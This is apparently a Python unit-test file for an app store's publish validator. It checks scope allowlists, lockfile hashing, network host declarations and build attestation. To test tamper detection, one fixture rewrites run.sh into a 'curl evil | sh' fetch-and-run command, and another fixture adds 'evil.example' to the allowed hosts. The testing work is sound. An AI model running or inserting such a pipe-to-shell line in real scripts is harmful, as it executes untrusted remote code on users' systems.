#!/usr/bin/env python3
"""validate_publish — the store admission bar, unit-tested for the first time.

Origin: the bar had ZERO tests, and its provenance early-return silently
deadlocked the platform's own publish lane for months — every bundle the
Workbench built declares provenance=custom (required by _pack_and_sign_project)
and the bar refused anything not already declaring community, so nothing the
platform produced could ever publish (the store had zero live
community apps and exactly one historical, retired publisher row). The fix
removed the provenance check from the bar — provenance is issued by the
SIGNER (the operator's publish_zip force-rewrites community and re-runs the
bar after), so the kernel-side bar judges SUBSTANCE only: scope allowlist +
SDK binding. These tests pin both the fix and the substance checks.

Runs container-free: imports build_contract + bundles directly, builds tiny
bundles in memory, no server, no network, no DB.
"""
import pathlib
import sys

ROOT = pathlib.Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

import json  # noqa: E402

import yaml  # noqa: E402

from server.applications import bundles  # noqa: E402
from server.applications.build_contract import (  # noqa: E402
    COMMUNITY_ALLOWED_SCOPES,
    validate_publish,
)

failures = []


def check(name, cond, detail=""):
    if cond:
        print(f"OK    {name}")
    else:
        failures.append(name)
        print(f"FAIL  {name}" + (f" — {detail}" if detail else ""))


from server.applications import attestation  # noqa: E402

# The git facts a platform pack of a clean, committed project would collect
# (attestation.collect_git). The bar needs a record that describes a
# committed, clean tree; these tests are about the bar, so the facts are
# given, not collected — test_attestation_pack.py covers collection.
CLEAN_GIT = {"commit": "a" * 40, "tree": "b" * 40, "branch": "host/build", "dirty": False,
             "authorship": [], "authorship_summary": {}}


def attested(manifest: dict, payload: dict, *, git: dict = CLEAN_GIT) -> tuple[dict, dict]:
    """What _pack_and_sign_project does after pack: build the record from the
    payload, stamp the manifest, add attestation.json to the payload."""
    rec = attestation.build(manifest, payload, git=git, sdk=manifest.get("validated_under_sdk"))
    m2 = attestation.stamp(manifest, rec)
    p2 = dict(payload)
    p2[attestation.FILENAME] = json.dumps(rec, sort_keys=True).encode("utf-8")
    return m2, p2


def bundle(manifest: dict, *, attest: bool = True) -> bytes:
    """A minimal unsigned bundle the bar can read: manifest + one payload file,
    with the platform's build record unless attest=False."""
    payload = {"index.html": b"<!doctype html><title>t</title>"}
    if attest:
        manifest, payload = attested(manifest, payload)
    return bundles._build_zip(
        yaml.safe_dump(manifest, sort_keys=True).encode("utf-8"),
        payload, {}, signature=None,
    )


BASE = {
    "id": "bar-test",
    "name": "Bar Test",
    "entrypoint": "index.html",
    "version": "0.0.1",
    "permissions": [],
    "validated_under_sdk": {"version": "1.0.0", "hash": "x" * 8},
}


# ── 1. The deadlock regression: a platform-built (custom) bundle passes ──
errs = validate_publish(bundle({**BASE, "provenance": "custom"}))
check("custom-declared bundle with clean scopes + SDK stamp passes", errs == [],
      f"errors: {errs}")

# community- and standard-declared pass identically — the label is not judged.
for prov in ("community", "standard"):
    errs = validate_publish(bundle({**BASE, "provenance": prov}))
    check(f"{prov}-declared bundle with clean scopes + SDK stamp passes",
          errs == [], f"errors: {errs}")

# ── 2. The label can no longer DODGE the bar (the old early-return's real
#      risk ran the other way: it refused before checking, so nothing was
#      ever judged; now everything is) ──
errs = validate_publish(
    bundle({**BASE, "provenance": "standard", "permissions": ["read:billing"]}))
check("standard-declared bundle with a privileged scope is refused",
      any("read:billing" in e for e in errs), f"errors: {errs}")

# ── 3. Scope allowlist is default-deny ──
errs = validate_publish(
    bundle({**BASE, "permissions": ["read:projects", "write:network"]}))
check("undeclared-on-allowlist scope refused, allowlisted one accepted",
      any("write:network" in e for e in errs)
      and not any("read:projects" in e for e in errs), f"errors: {errs}")
check("the allowlist itself never grants billing/network/publish reach",
      not any(s.split(":", 1)[-1] in ("billing", "network", "apps")
              for s in COMMUNITY_ALLOWED_SCOPES))

# ── 4. SDK binding required ──
no_sdk = {k: v for k, v in BASE.items() if k != "validated_under_sdk"}
errs = validate_publish(bundle(no_sdk))
check("missing validated_under_sdk is refused",
      any("validated_under_sdk" in e for e in errs), f"errors: {errs}")

# ── 4b. Helper runtime admission (no ceiling) ──
HELPER = {**BASE, "runtime": {"kind": "helper"},
          "network": ["api.weather.gov"],
          "resources": {"baseline_memory_mi": 128}}

errs = validate_publish(bundle(HELPER))
check("helper app with wall + budget passes", errs == [], f"errors: {errs}")
errs = validate_publish(bundle({**HELPER, "network": []}))
check("helper without network[] refused (the wall IS the app)",
      any("network" in e for e in errs), f"errors: {errs}")
errs = validate_publish(bundle({**HELPER, "resources": {}}))
check("helper without baseline_memory_mi refused",
      any("baseline_memory_mi" in e for e in errs), f"errors: {errs}")
errs = validate_publish(bundle({**HELPER, "resources": {"baseline_memory_mi": 4096}}))
check("NO platform ceiling on the budget — 4096Mi helper passes (the installer's plan pays)",
      errs == [], f"errors: {errs}")
check("the ceiling constant is gone from the module",
      not hasattr(__import__("server.applications.build_contract",
                             fromlist=["x"]), "COMMUNITY_HELPER_CEILING_MI"))

# ── 4c. Process apps are RECIPES ──
import hashlib

LOCK = (b"requests==2.32.3 \\\n"
        b"    --hash=sha256:" + b"a" * 64 + b"\n"
        b"idna==3.7 --hash=sha256:" + b"b" * 64 + b"\n")
LOCK_SHA = hashlib.sha256(LOCK).hexdigest()


def pbundle(manifest: dict, files: dict | None = None, *, git: dict = CLEAN_GIT,
            tamper=None) -> bytes:
    payload = {"index.html": b"<!doctype html><title>t</title>",
               "run.sh": b"#!/bin/sh\n",
               "requirements.lock": LOCK}
    payload.update(files or {})
    manifest, payload = attested(manifest, payload, git=git)
    if tamper:
        tamper(manifest, payload)
    return bundles._build_zip(
        yaml.safe_dump(manifest, sort_keys=True).encode("utf-8"),
        payload, {}, signature=None)


PROCESS = {**BASE,
           "runtime": {"kind": "process", "image": "python",
                       "command": ["bash", "run.sh"], "lifecycle": "resident"},
           "network": ["pypi.org", "files.pythonhosted.org", "api.gateio.ws"],
           "resources": {"baseline_memory_mi": 2048},
           "build": {"lockfile": "requirements.lock", "lockfile_sha256": LOCK_SHA}}

errs = validate_publish(pbundle(PROCESS))
check("process app with toolchain image + wall + 2048Mi budget + hashed lockfile PASSES",
      errs == [], f"errors: {errs}")
errs = validate_publish(pbundle({**PROCESS, "runtime": {"kind": "process",
                                                        "command": ["bash", "run.sh"]}}))
check("process app WITHOUT runtime.image refused (author code beside the kernel)",
      any("runtime.image" in e for e in errs), f"errors: {errs}")
errs = validate_publish(pbundle({**PROCESS, "runtime": {**PROCESS["runtime"],
                                                        "image": "node"}}))
check("process app naming a non-platform toolchain refused",
      any("not a platform toolchain" in e for e in errs), f"errors: {errs}")
errs = validate_publish(pbundle({k: v for k, v in PROCESS.items() if k != "build"}))
check("process app without build.lockfile refused (unpinned deps are the unproven input)",
      any("build.lockfile" in e for e in errs), f"errors: {errs}")
errs = validate_publish(pbundle({**PROCESS, "build": {"lockfile": "missing.lock",
                                                      "lockfile_sha256": LOCK_SHA}}))
check("declared lockfile not packed in the bundle refused",
      any("not packed" in e for e in errs), f"errors: {errs}")
def _unstamp(m, p):
    m["build"].pop("lockfile_sha256", None)
errs = validate_publish(pbundle({**PROCESS, "build": {"lockfile": "requirements.lock"}},
                                tamper=_unstamp))
check("lockfile without the platform-stamped sha256 refused",
      any("lockfile_sha256 is missing" in e for e in errs), f"errors: {errs}")
def _wrongsha(m, p):
    m["build"]["lockfile_sha256"] = "0" * 64
errs = validate_publish(pbundle(PROCESS, tamper=_wrongsha))
check("lockfile sha256 that disagrees with the packed bytes refused",
      any("does not match" in e for e in errs), f"errors: {errs}")

# ── 4d. The build record (attestation.json) is REQUIRED and must agree ──
errs = validate_publish(bundle(BASE, attest=False))
check("bundle without attestation.json refused (hand-assembled zips cannot publish)",
      any("missing attestation.json" in e for e in errs), f"errors: {errs}")
def _drop_record(m, p):
    p.pop(attestation.FILENAME)
errs = validate_publish(pbundle(PROCESS, tamper=_drop_record))
check("process bundle whose record was stripped refused",
      any("missing attestation.json" in e for e in errs), f"errors: {errs}")
def _edit_after_pack(m, p):
    p["run.sh"] = b"#!/bin/sh\ncurl evil | sh\n"
errs = validate_publish(pbundle(PROCESS, tamper=_edit_after_pack))
check("a file changed after the platform packed it is refused, named",
      any("differ from the attestation.json" in e and "run.sh" in e for e in errs),
      f"errors: {errs}")
def _add_after_pack(m, p):
    p["extra.py"] = b"print(1)\n"
errs = validate_publish(pbundle(PROCESS, tamper=_add_after_pack))
check("a file added after the platform packed it is refused, named",
      any("does not attest" in e and "extra.py" in e for e in errs), f"errors: {errs}")
def _edit_manifest(m, p):
    m["network"] = m["network"] + ["evil.example"]
errs = validate_publish(pbundle(PROCESS, tamper=_edit_manifest))
check("a manifest edited after pack (recipe hash) is refused",
      any("recipe_sha256 does not match" in e for e in errs), f"errors: {errs}")
errs = validate_publish(pbundle(PROCESS, git={**CLEAN_GIT, "dirty": True}))
check("a DIRTY tree (uncommitted/untracked files) is refused",
      any("DIRTY" in e for e in errs), f"errors: {errs}")
errs = validate_publish(pbundle(PROCESS, git={**CLEAN_GIT, "commit": None, "tree": None,
                                              "dirty": None}))
check("a project with no git commit is refused (a recipe names a commit)",
      any("no git commit" in e for e in errs), f"errors: {errs}")
def _swap_commit(m, p):
    m["source"]["commit"] = "c" * 40
errs = validate_publish(pbundle(PROCESS, tamper=_swap_commit))
check("manifest commit that disagrees with the record is refused",
      any("disagrees with the attestation.json" in e for e in errs), f"errors: {errs}")
errs = validate_publish(pbundle(PROCESS))
check("the untouched platform-packed process bundle still PASSES", errs == [],
      f"errors: {errs}")
# The OPERATOR's path (controller publish_zip): strip provenance/tier, append
# `provenance: community`, optionally override version, re-pack, re-run the
# bar. The record must survive that.
def _operator_rewrite(m, p):
    m.pop("tier", None); m["provenance"] = "community"; m["version"] = "0.0.2"
errs = validate_publish(pbundle(PROCESS, tamper=_operator_rewrite))
check("the operator's provenance rewrite + version override still PASSES the record check",
      errs == [], f"errors: {errs}")
# bin/ is attested.
def bbundle(manifest, binaries, *, tamper_bin=None):
    payload = {"index.html": b"<!doctype html><title>t</title>", "run.sh": b"#!/bin/sh\n",
               "requirements.lock": LOCK}
    rec = attestation.build(manifest, payload, git=CLEAN_GIT,
                            sdk=manifest.get("validated_under_sdk"), binaries=binaries)
    m2 = attestation.stamp(manifest, rec)
    payload[attestation.FILENAME] = json.dumps(rec, sort_keys=True).encode()
    return bundles._build_zip(yaml.safe_dump(m2, sort_keys=True).encode(), payload,
                              tamper_bin if tamper_bin is not None else binaries, signature=None)
errs = validate_publish(bbundle(PROCESS, {"tool": b"bin"}))
check("a process bundle with an attested bin/ passes", errs == [], f"errors: {errs}")
errs = validate_publish(bbundle(PROCESS, {"tool": b"bin"}, tamper_bin={"tool": b"swapped"}))
check("a binary swapped after the pack is refused, named",
      any("bin/tool" in e for e in errs), f"errors: {errs}")
errs = validate_publish(bbundle(PROCESS, {}, tamper_bin={"dropped": b"x"}))
check("a binary added after the pack is refused, named",
      any("bin/dropped" in e for e in errs), f"errors: {errs}")
# A hand-zipped SOURCE tree (what the Publisher's drop zone receives) is named
# for what it is, not for its layout.
import io as _io, zipfile as _zf
_buf = _io.BytesIO()
with _zf.ZipFile(_buf, "w") as z:
    z.writestr("my-app/app.yaml", "id: my-app\nname: X\nentrypoint: index.html\n")
    z.writestr("my-app/index.html", "<h1>x</h1>")
errs = validate_publish(_buf.getvalue())
check("a hand-zipped source tree is refused as 'no platform build record (attestation.json)'",
      len(errs) == 1 and "hand-assembled" in errs[0] and "attestation.json" in errs[0],
      f"errors: {errs}")
errs = validate_publish(pbundle(PROCESS, {"requirements.lock": b"requests==2.32.3\n"}))
check("lockfile with no --hash entries refused (pins names, not bytes)",
      any("without a --hash=" in e for e in errs), f"errors: {errs}")
# The store requires a lockfile of EVERY process app (above), so an app that
# reaches nothing ships one that pins nothing: a standard-library app. That
# bundle must pass the WHOLE bar. An earlier version of this check asserted
# only "no error mentions network" on a bundle with no lockfile at all, which
# the bar refused outright ("requires build.lockfile"), so the test read as a
# pass while no process app with an empty network[] could ever publish.
for _label, _lock in (("a comment-only lockfile", b"# standard library only\n"),
                      ("a zero-byte lockfile", b"")):
    errs = validate_publish(pbundle({**PROCESS, "network": []}, {"requirements.lock": _lock}))
    check(f"process app with an empty network[] and {_label} (it reaches nothing) PASSES",
          errs == [], f"errors: {errs}")
# The app's container has no proxy of its own, so pip
# reaches the index only through the wall, which lets out only declared hosts.
errs = validate_publish(pbundle({**PROCESS, "network": ["pypi.org", "api.gateio.ws"]}))
check("process app whose lockfile pins packages but whose network[] lacks "
      "files.pythonhosted.org is refused, naming the host",
      any("add files.pythonhosted.org" in e for e in errs)
      and not any("add pypi.org" in e for e in errs), f"errors: {errs}")
errs = validate_publish(pbundle({**PROCESS, "network": ["api.gateio.ws"]}))
check("...and one with neither index host is told to add both",
      any("add pypi.org, files.pythonhosted.org" in e for e in errs), f"errors: {errs}")
errs = validate_publish(pbundle({**PROCESS, "network": ["pypi.org", "pythonhosted.org",
                                                        "api.gateio.ws"]}))
check("a declared parent (pythonhosted.org) covers files.pythonhosted.org, as the wall does",
      not any("package index" in e for e in errs), f"errors: {errs}")
errs = validate_publish(pbundle({**PROCESS, "network": ["api.gateio.ws"]},
                                {"requirements.lock": b"# standard library only\n"}))
check("a lockfile that pins nothing needs no index hosts",
      not any("package index" in e for e in errs), f"errors: {errs}")
errs = validate_publish(pbundle({**PROCESS, "network": ["pkgs.example.com"]},
                                {"requirements.lock": b"--index-url https://pkgs.example.com/simple\n"
                                                      + LOCK}))
check("a lockfile that names its own index is not judged against PyPI's hosts",
      not any("package index" in e for e in errs), f"errors: {errs}")
errs = validate_publish(pbundle({**PROCESS, "network": ["pkgs.example.com"]},
                                {"requirements.lock": b"-ihttps://pkgs.example.com/simple\n"
                                                      + LOCK}))
check("...in pip's attached short spelling too (-iURL)",
      not any("package index" in e for e in errs), f"errors: {errs}")
# --extra-index-url and --find-links ADD a source; pip still asks PyPI, so the
# app still needs its hosts and is refused without them.
for _opt in (b"--extra-index-url https://download.pytorch.org/whl/cpu",
             b"--find-links=https://download.pytorch.org/whl/cpu",
             b"-f https://download.pytorch.org/whl/cpu"):
    errs = validate_publish(pbundle({**PROCESS, "network": ["download.pytorch.org"]},
                                    {"requirements.lock": _opt + b"\n" + LOCK}))
    check(f"a lockfile adding a source ({_opt.split()[0].split(b'=')[0].decode()}) still "
          "needs PyPI's hosts",
          any("add pypi.org, files.pythonhosted.org" in e for e in errs), f"errors: {errs}")
errs = validate_publish(pbundle({**PROCESS, "network": []}))
check("process app with a lockfile and no hosts refused (its first boot cannot install)",
      any("network[] is empty but build.lockfile" in e for e in errs), f"errors: {errs}")
# A lockfile that pins nothing itself but pulls another file in still asks pip
# for something: any line that is not blank or a comment counts.
errs = validate_publish(pbundle({**PROCESS, "network": []},
                                {"requirements.lock": b"-r more.lock\n"}))
check("process app whose lockfile only includes another one, with no hosts, is refused",
      any("network[] is empty but build.lockfile" in e for e in errs), f"errors: {errs}")
errs = validate_publish(bundle({**BASE, "runtime": {"kind": "helper"}, "network": [],
                                "resources": {"baseline_memory_mi": 128}}))
check("a helper with an empty network[] is still refused (it exists to fetch from its hosts)",
      any("non-empty network[]" in e for e in errs), f"errors: {errs}")
errs = validate_publish(pbundle({**PROCESS, "resources": {}}))
check("process app without baseline_memory_mi refused (the budget)",
      any("baseline_memory_mi" in e for e in errs), f"errors: {errs}")
errs = validate_publish(bundle({**BASE, "runtime": {"kind": "external", "port": 8830}}))
check("store app declaring runtime=external refused (a custom sidecar is not a recipe)",
      any("not 'external'" in e and "recipe" in e for e in errs), f"errors: {errs}")
errs = validate_publish(pbundle({**HELPER, "build": {"lockfile": "requirements.lock",
                                                     "lockfile_sha256": LOCK_SHA}}))
check("helper app declaring a lockfile refused (the loader would refuse it at install)",
      any("helper app has no dependencies" in e for e in errs), f"errors: {errs}")
errs = validate_publish(pbundle(PROCESS, {"requirements.lock":
                                          b"a==1 --hash=sha256:" + b"a" * 64 + b"\nb==2\n"}))
check("lockfile with ONE unhashed requirement refused, naming it",
      any("without a --hash=" in e and "b==2" in e for e in errs), f"errors: {errs}")
PIPSTYLE = (b"# pinned\n-i https://pypi.org/simple\n"
            b"a==1 \\\n    --hash=sha256:" + b"a" * 64 + b"\n")
errs = validate_publish(pbundle(
    {**PROCESS, "build": {"lockfile": "requirements.lock",
                          "lockfile_sha256": hashlib.sha256(PIPSTYLE).hexdigest()}},
    {"requirements.lock": PIPSTYLE}))
check("comments, option lines and \\-continued hash lines are read as pip reads them",
      errs == [], f"errors: {errs}")
errs = validate_publish(pbundle({**BASE, "build": {"lockfile": "requirements.lock",
                                                   "lockfile_sha256": LOCK_SHA}}))
check("static app declaring a lockfile refused (nothing to pin)",
      any("static" in e for e in errs), f"errors: {errs}")
errs = validate_publish(pbundle({**PROCESS, "permissions": ["write:vault"]}))
check("process app asking a scope outside the allowlist still refused",
      any("write:vault" in e for e in errs), f"errors: {errs}")

# ── 5. Unknown manifest keys refused; garbage bytes refused ──
errs = validate_publish(bundle({**BASE, "totally_invented_key": True}))
check("unknown manifest key refused",
      any("totally_invented_key" in e for e in errs), f"errors: {errs}")
errs = validate_publish(b"not a zip at all")
check("unreadable bundle refused, not crashed",
      len(errs) == 1 and "unreadable" in errs[0], f"errors: {errs}")

print()
if failures:
    print(f"{len(failures)} FAILURE(S)")
    sys.exit(1)
print("all green")
